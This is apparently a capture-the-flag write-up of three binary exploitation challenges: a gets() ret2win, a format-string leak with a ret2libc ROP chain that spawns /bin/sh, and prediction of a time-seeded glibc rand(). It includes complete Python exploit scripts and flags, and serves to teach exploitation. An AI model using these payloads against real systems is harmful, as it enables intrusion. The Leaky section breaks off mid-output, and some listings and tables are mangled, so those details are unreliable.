![KaliTeam CTF 2026 binary exploitation writeup — three challenges solved covering Player ret2win via gets overflow, Leaky format-string ret2libc ROP, and Raryray predictable PRNG time seed](https://cybersecurityelite.com/images/articles/kaliteam-ctf-2026-pwn-writeup.png)Table of Contents

KaliTeam CTF 2026’s binary exploitation track offered three challenges that span the classic pwn curriculum without repeating themselves: **Player** is a pure ret2win in its most elemental form — `gets()`, no canary, no PIE, one call to `win()`; **Leaky** layers a format-string vulnerability and a stack overflow into the same buffer, demanding a two-stage attack that leaks both a libc address and a stack pointer before building a ROP chain on a re-entered frame; and **Raryray** is the structural outlier — a PIE binary hardened with NX, Full RELRO, IBT, and SHSTK where there is no memory corruption at all, only a logic flaw: the flag is hidden behind a `rand()` call seeded with `time(NULL)`, and anyone who can reimplement glibc’s PRNG can predict the block index before the binary prints the prompt.

All three exploit scripts use only the Python standard library — no pwntools dependency — and work against the remote service directly over TCP.

## Challenge 1 — Player#

### Challenge at a glance#

Field| Value  
---|---  
CTF| KaliTeam CTF 2026  
Category| Binary Exploitation  
Challenge| Player  
Service| `nc chall.kali-team.online 10006`  
Flag| `KaliTeam{fce057d8-575a-4292-89b6-0a64a036e33a}`  
  
**Files provided:** `warmy` ELF (the challenge archive is named `player.zip` but the binary inside is called `warmy`).

### Step 1 — Surveying the binary#

```
    $ file warmy
    warmy: ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped
    
    $ checksec --file=warmy
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    SHSTK:    Enabled
    IBT:      Enabled
    Stripped: No
```

Three mitigations are absent that matter most for a stack overflow: no stack canary, no PIE, not stripped. NX is present — the stack is non-executable — but that is irrelevant for a ret2win attack where we redirect control to existing code rather than shellcode.

### Step 2 — Finding the vulnerability#

The binary has three user-visible functions. Examining them:

```
    void win(void) {                       // 0x401236
        FILE *file = fopen("flag.txt", "r");
        if (file == NULL) { puts("Error: flag.txt not found."); exit(1); }
        printf("The Flag: ");
        for (int c = fgetc(file); c != EOF; c = fgetc(file))
            putchar(c);
        putchar('\n');
        fclose(file);
    }
    
    void vuln(void) {                      // 0x4012ce
        char input[64];
        puts("Hola! ");
        gets(input);                       // unbounded read — no length limit
    }
    
    int main(void) {                       // 0x4012fd
        vuln();
        return 0;
    }
```

`gets()` was removed from C11 precisely because it provides no way to bound the number of bytes read. It reads until a newline or EOF and writes the entire input — plus a NUL terminator — into its destination buffer. With `input` declared as 64 bytes, any input longer than 63 characters overflows into the stack frame above.

### Step 3 — Computing the overflow offset#

The relevant disassembly of `vuln()`:

```
    4012ce: push   rbp
    4012d3: mov    rbp, rsp
    4012d6: sub    rsp, 0x40              ; allocate 64 bytes (0x40) for input[]
    4012da: lea    rax, [rip + 0xd55]    ; "Hola! "
    4012e4: call   puts@plt
    4012e9: lea    rax, [rbp - 0x40]     ; address of input[0]
    4012f0: xor    eax, eax
    4012f5: call   gets@plt              ; VULNERABLE: unbounded write to rbp-0x40
    4012fa: nop
    4012fb: leave
    4012fc: ret
```

Stack layout at the moment `gets()` reads input:

```
    rbp - 0x40  ┌────────────────────────┐
                │ input[0..63]           │  64 bytes  ← gets() writes here
    rbp         ├────────────────────────┤
                │ saved rbp              │   8 bytes
    rbp + 0x08  ├────────────────────────┤
                │ saved return address   │   8 bytes  ← we overwrite this
                └────────────────────────┘
```

Offset to saved return address: `0x40 (buffer) + 0x08 (saved rbp) = 0x48 = 72 bytes`.

### Step 4 — Stack alignment and the ret gadget#

On AMD64, the System V ABI mandates that `RSP` is 16-byte aligned at the point of a `call` instruction (meaning `RSP % 16 == 8` just after the call’s implicit push). Some libc functions — `printf`, `fopen`, and the SSE/AVX routines they call internally — raise a `#GP` fault if this invariant is violated.

When `ret` pops the saved return address and jumps to it, the stack pointer ends up at whichever alignment it lands on. If we jump directly to `win()` from `vuln()`’s frame, the alignment is wrong by 8 bytes and `fopen` will crash before printing the flag.

The fix is a single `ret` gadget — an instruction that does nothing except pop 8 bytes from the stack, fixing the alignment — placed between our padding and the address of `win()`. The binary has one at `0x40101a`.

### Step 5 — Building and sending the payload#

Final payload (88 bytes):

```
    [64 bytes padding] [8 bytes saved rbp overwrite] [8 bytes ret gadget] [8 bytes win()]
     ─────────────────  ──────────────────────────────  ─────────────────   ──────────────
     b"A" * 72                                          0x40101a            0x401236
```

```
    #!/usr/bin/env python3
    import socket, struct, re
    
    OFFSET = 72
    RET    = 0x40101A   # bare ret for stack alignment
    WIN    = 0x401236   # win() — opens flag.txt and prints it
    
    def p64(v): return struct.pack("<Q", v)
    
    def recv_until(s, marker):
        buf = bytearray()
        while marker not in buf:
            buf.extend(s.recv(4096))
        return bytes(buf)
    
    with socket.create_connection(("chall.kali-team.online", 10006), 5) as s:
        s.settimeout(5)
        recv_until(s, b"Hola!")
        payload = b"A" * OFFSET + p64(RET) + p64(WIN) + b"\n"
        s.sendall(payload)
        data = bytearray()
        while True:
            chunk = s.recv(4096)
            if not chunk: break
            data.extend(chunk)
    
    flag = re.search(rb"KaliTeam\{[^}]+\}", data)
    print(flag.group().decode() if flag else repr(bytes(data)))
```

Running it:

```
    KaliTeam{fce057d8-575a-4292-89b6-0a64a036e33a}
```

## Challenge 2 — Leaky#

### Challenge at a glance#

Field| Value  
---|---  
CTF| KaliTeam CTF 2026  
Category| Binary Exploitation  
Challenge| Leaky  
Service| `nc chall.kali-team.online 10097`  
Flag| `KaliTeam{13ead81c-5edf-4215-aae4-a20ca05e26cc}`  
  
**Files provided:** `leaky` ELF and a matching `libc.so.6`.

### Step 1 — Surveying the binary#

```
    $ checksec --file=leaky
    RELRO:    Full RELRO
    Canary:   false
    NX:       true
    PIE:      false
    RUNPATH:  ./
```

No canary and no PIE — same as Player — but this time Full RELRO means we cannot overwrite GOT entries. There is also a custom libc provided, which is the hint that we will need to ret2libc using the specific offsets from that file rather than relying on the remote system’s default.

### Step 2 — Understanding the dual vulnerability#

The entire challenge lives in `challenge()` at `0x4011b3`:

```
    void challenge(void) {
        char buf[16];
        puts("Welcome! Enter input:");
        read(0, buf, 0x60);    // reads 96 bytes into a 16-byte buffer
        printf(buf);           // buf is used as the format string
    }
```

Two bugs, one buffer:

  1. **Format string:** `printf(buf)` passes the user-controlled buffer directly as the format string. Any `%p`, `%x`, `%s`, `%n` specifiers in the input are interpreted by `printf`, giving arbitrary stack reads and writes.

  2. **Stack overflow:** `read(0, buf, 0x60)` reads up to 96 bytes into a 16-byte buffer, providing 80 bytes of overflow past the end of `buf`.


Stack layout at the `read()` call:

```
    rbp - 0x10  ┌────────────────────────┐
                │ buf[0..15]             │  16 bytes  ← read() + printf() both here
    rbp         ├────────────────────────┤
                │ saved rbp              │   8 bytes
    rbp + 0x08  ├────────────────────────┤
                │ saved return address   │   8 bytes
                └────────────────────────┘
```

Offset to saved return address: `0x10 + 0x08 = 0x18 = 24 bytes`.

The challenge name and the binary name (“Leaky”) both tell you exactly what to do: use the format string bug to leak memory, then use the overflow to redirect execution.

### Step 3 — Choosing what to leak#

Two pieces of information are needed to build a ret2libc ROP chain:

  1. **`libc_base`** — to compute the runtime addresses of `pop rdi ; ret`, `ret` (alignment), and `system`.
  2. **A stack address** — to point `rdi` at the string `"/bin/sh"` which we will plant in the buffer of the _second_ call to `challenge()`.


Both are available on the stack when `printf` runs. Probing with `%1$p.%2$p.%3$p.%4$p.` against a local test reveals that:

  * **`%1$p`** → address of `buf` itself (i.e., `rbp - 0x10`). This is the stack address we need.
  * **`%3$p`** → a pointer into `libc` that happens to be `read + 0x12` = `libc_base + 0x114822`.


Subtracting the known offset recovers `libc_base`. Adding `0x10` to the leaked stack address gives us the address that `buf` will occupy on the _next_ call to `challenge()` (because the extra `ret` gadget in the overflow payload shifts the stack frame by 8 bytes, and the new frame’s `rbp` is therefore `stack_buf_1 + 0x10 + 0x10`, making `buf` at `stack_buf_1 + 0x10`).

### Step 4 — Stage 1: leak and re-enter#

We need both the format string output **and** an overflow payload in the same `read()` call. The format string (`%1$p.%3$p.`) fits in fewer than 16 bytes, so we pad it to exactly 24 bytes (filling the buffer and saved rbp), then write the ROP redirect:

```
    [format_string] [padding to 24 bytes] [ret gadget] [challenge()]
```

The `ret` gadget at `0x40101a` (the binary’s own `ret` instruction) serves double duty:

  * Fixes the 16-byte stack alignment before `challenge()` re-runs its `puts`.
  * Shifts the next stack frame by 8 bytes, so that `%1$p` in the second call points 8 bytes higher than it did in the first — and `buf` in the second call lives at `stack_buf_1 + 0x10`.


```
    OFFSET    = 24
    CHALLENGE = 0x4011B3
    BIN_RET   = 0x40101A
    
    def build_stage1():
        fmt = b"%1$p.%3$p."
        return fmt + b"A" * (OFFSET - len(fmt)) + p64(BIN_RET) + p64(CHALLENGE)
```

Sending this payload causes `printf` to print two hex addresses. We parse them:

```
    def parse_leaks(data):
        m = re.search(rb"(0x[0-9a-fA-F]+)\.(0x[0-9a-fA-F]+)\.", data)
        stack_buf_1 = int(m.group(1), 16)
        read_ret    = int(m.group(2), 16)
        libc_base   = read_ret - 0x114822
        stack_buf_2 = stack_buf_1 + 0x10
        return stack_buf_2, libc_base
```

### Step 5 — Libc gadget offsets#

From the provided `libc.so.6` (verified against its SHA-256):

```
    system          =  libc_base + 0x50d70
    pop rdi ; ret   =  libc_base + 0x2a3e5
    ret             =  libc_base + 0x29cd6   # alignment gadget
```

These are obtained by disassembling the supplied libc and searching for the gadgets:

```
    $ ROPgadget --binary libc.so.6 --re "pop rdi ; ret" | head -5
    0x000000000002a3e5 : pop rdi ; ret
    
    $ nm -D libc.so.6 | grep ' system'
    000000000005 0d70 T system
```

### Step 6 — Stage 2: shell and flag#

The second `challenge()` invocation re-runs `read()` on a fresh buffer. We place `"/bin/sh\x00"` at the start of the buffer (it fits in 8 bytes), pad to 24, then write the ROP chain:

```
    ["/bin/sh\x00"] [padding to 24] [ret] [pop rdi ; ret] [stack_buf_2] [system]
```

When `challenge()` returns through the chain:

  1. `ret` fixes alignment.
  2. `pop rdi ; ret` loads `rdi` with `stack_buf_2` (which points to `"/bin/sh"`).
  3. `system("/bin/sh")` spawns a shell.


We then send `echo; cat flag.txt; exit` over the same socket to read the flag from the shell.

```
    LIBC_READ_RET = 0x114822
    LIBC_RET      = 0x29CD6
    LIBC_POP_RDI  = 0x2A3E5
    LIBC_SYSTEM   = 0x50D70
    
    def build_stage2(stack_buf_2, libc_base):
        cmd = b"/bin/sh\x00"
        rop = (
            p64(libc_base + LIBC_RET)
            + p64(libc_base + LIBC_POP_RDI)
            + p64(stack_buf_2)
            + p64(libc_base + LIBC_SYSTEM)
        )
        return cmd + b"B" * (OFFSET - len(cmd)) + rop
```

Running the full two-stage exploit:

```
    [+] stack buffer 2 = 0x7ffd3a1b2c30
    [+] libc base      = 0x7f8b45200000

## Challenge 3 — Raryray#

### Challenge at a glance#

Category| Binary Exploitation  
Challenge| Raryray  
Service| `nc chall.kali-team.online 10007`  
Flag| `KaliTeam{c5f2d7b3-9d34-4eba-a1fe-4d6e094446e2}`  
  
**Files provided:** `rayray` ELF and a matching `libc.so.6` (different from Leaky’s).

### Step 1 — Surveying the binary#

```
    $ checksec --file=rayray
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
    SHSTK:    Enabled
    IBT:      Enabled
    Stripped: No
```

This is the most hardened binary in the set: PIE, NX, Full RELRO, shadow stack (SHSTK), and indirect branch tracking (IBT). The natural instinct is to look harder for a stack overflow — but that is the wrong instinct. Reading the decompilation more carefully reveals no memory corruption whatsoever.

### Step 2 — Reading the program logic#

`vuln()` (at PIE offset `0x12c9`) allocates a large frame and performs three distinct phases:

**Phase 1 — Fill 100 blocks with decoy`rand()` output (before `srand`):**

```
    char blocks[100][64];
    for (int i = 0; i < 100; i++) {
        snprintf(blocks[i], 64,
                 " Block %d data: 0x%08X (No flag here)", i, rand());
    }
```

These 100 `rand()` calls happen **before** `srand()`, so they draw on glibc’s default uninitialized PRNG state. Their output is not predictable without knowing that state, but it does not matter — none of these blocks will hold the flag.

**Phase 2 — Plant the flag in a PRNG-chosen block:**

```
     unsigned seed = (unsigned)time(NULL);
    srand(seed);
    int flag_index = rand() % 100;
    
    FILE *flag = fopen("./flag.txt", "r");
    fgets(blocks[flag_index], 64, flag);
    fclose(flag);
```

This is the only block that holds the flag. The index is the **first`rand()` output after `srand(seed)`**, reduced mod 100.

**Phase 3 — Read a user-provided block number and bounds-check it:**

```
     char input_buf[16];
    read(0, input_buf, 15);
    input_buf[read_result] = '\0';
    int choice = atoi(input_buf);
    
    if (choice < 0 || choice > 99) {
        puts("Invalid block number.");
        return;
    }
    puts(blocks[choice]);
```

The bounds check at `choice < 0 || choice > 99` is correct and well-implemented. There is no off-by-one, no sign confusion, no integer overflow. The challenge is a **logic vulnerability** , not a memory safety vulnerability. All those mitigations in checksec are red herrings.

### Step 3 — Why `time(NULL)` is not a secret#

`time(NULL)` returns the number of seconds since the Unix epoch, with one-second resolution. This value is:

  * **Predictable** : any machine with a synchronized clock knows the current Unix timestamp.
  * **Low entropy** : there is at most one bit of uncertainty per second.
  * **Observable** : the service’s banner and TCP handshake arrive within a second of the `srand()` call, so we know the window of candidate seeds to within `±2` seconds.


A remote attacker cannot know the _exact_ second the server called `srand()`, but they can narrow it to a range of four or five consecutive values and try each one separately, opening a fresh TCP connection per candidate.

### Step 4 — Reimplementing glibc’s PRNG#

`rand()` in glibc uses an **additive feedback generator** of degree 31 (also called a linear feedback shift register over integers). The specification:

  1. If `seed == 0`, substitute `seed = 1`.
  2. Compute `r[0] = seed`, then generate `r[1]` through `r[30]` using Park-Miller: `r[i] = (16807 × r[i−1]) mod 2147483647`.
  3. Copy `r[31] = r[0]`, `r[32] = r[1]`, `r[33] = r[2]` (extending the table by 3).
  4. Continue the recurrence: `r[i] = (r[i−31] + r[i−3]) mod 2³²` for `i ≥ 34`.
  5. The first value returned by `rand()` is `r[344] >> 1`.


Steps 1–4 represent the “warm-up” period (344 iterations) that glibc performs inside `srand()` before returning. The output is obtained by shifting right by 1 to clear the sign bit, keeping the result in `[0, 2³¹ − 1]`.

Python implementation:

```
    def glibc_rand(seed: int) -> int:
        """Return the first rand() value after glibc srand(seed)."""
        seed &= 0xFFFFFFFF
        if seed == 0:
            seed = 1
    
        state = [seed]
        for _ in range(1, 31):
            state.append((16807 * state[-1]) % 2_147_483_647)
    
        # Extend by 3 to simplify the recurrence index arithmetic
        state.extend(state[:3])
    
        for i in range(34, 345):
            state.append((state[i - 31] + state[i - 3]) & 0xFFFFFFFF)
    
        return state[344] >> 1
```

Verification against known values:

Seed| Expected first `rand()`  
---|---  
1| 1804289383  
2| 1505335290  
1234| 479142414  
0x12345678| 457715892  
  
### Step 5 — Timing window and candidate iteration#

The exploit tries candidate seeds in order of increasing distance from the current timestamp:

```
    def candidate_deltas(window):
        yield 0
        for distance in range(1, window + 1):
            yield -distance
            yield distance
```

For each candidate it opens a fresh TCP connection, waits for the prompt, computes `glibc_rand(seed) % 100`, sends that number, and checks whether the response matches `KaliTeam{…}`:

```
    for delta in candidate_deltas(window=2):
        seed  = int(time.time()) + delta
        block = glibc_rand(seed) % 100
        # open connection, send str(block), check response
```

In practice, `delta == 0` succeeds on the majority of runs when the attacker’s clock is synchronized. The `±2` window catches clock-skew edge cases reliably.

    import re, socket, sys, time
    
    PROMPT       = b"enter Block number: "
    FLAG_PATTERN = re.compile(rb"KaliTeam\{[^}\r\n]+\}")
    
    
    def glibc_rand(seed: int) -> int:
        seed &= 0xFFFFFFFF
        if seed == 0:
            seed = 1
        state = [seed]
        for _ in range(1, 31):
            state.append((16807 * state[-1]) % 2_147_483_647)
        state.extend(state[:3])
        for i in range(34, 345):
            state.append((state[i - 31] + state[i - 3]) & 0xFFFFFFFF)
        return state[344] >> 1
    
    
    def recv_until(s, marker):
        buf = bytearray()
        while marker not in buf:
            chunk = s.recv(4096)
            if not chunk:
                raise RuntimeError("connection closed")
            buf.extend(chunk)
        return bytes(buf)
    
    
    def try_delta(host, port, delta, timeout=5.0):
        with socket.create_connection((host, port), timeout) as s:
            s.settimeout(timeout)
            recv_until(s, PROMPT)
            seed  = int(time.time()) + delta
            block = glibc_rand(seed) % 100
            print(f"[*] seed={seed}  delta={delta:+d}  block={block}", file=sys.stderr)
            s.sendall(f"{block}\n".encode())
            buf = bytearray()
            while True:
                try:
                    chunk = s.recv(4096)
                except socket.timeout:
                    break
                if not chunk:
                    break
                buf.extend(chunk)
            return bytes(buf)
    
    
    host, port = "chall.kali-team.online", 10007
    for delta in [0, -1, 1, -2, 2]:
        response = try_delta(host, port, delta)
        m = FLAG_PATTERN.search(response)
        if m:
            print(m.group().decode())
            break
    else:
        sys.exit("flag not found — increase the timing window or check clock sync")
```

Running it:

```
    [*] seed=1754390400  delta=0  block=37
    KaliTeam{c5f2d7b3-9d34-4eba-a1fe-4d6e094446e2}

**Player**| `gets()` stack overflow| No canary, no PIE| 72-byte offset; `ret=0x40101a`; `win=0x401236`| `KaliTeam{fce057d8-575a-4292-89b6-0a64a036e33a}`

**Raryray**|  Predictable `time(NULL)` seed|  _None_ — PIE/NX/RELRO/SHSTK all irrelevant| `glibc_rand(time(NULL)) % 100`; ±2s timing window| `KaliTeam{c5f2d7b3-9d34-4eba-a1fe-4d6e094446e2}`  
  
Raryray is the most instructive of the three: it demonstrates that binary hardening mitigations (PIE, NX, Full RELRO, shadow stack, IBT) protect against memory corruption but are powerless against a logic flaw. A deterministic PRNG seeded with a low-entropy, externally observable value is not random, regardless of how many compiler flags protect the binary that calls it.
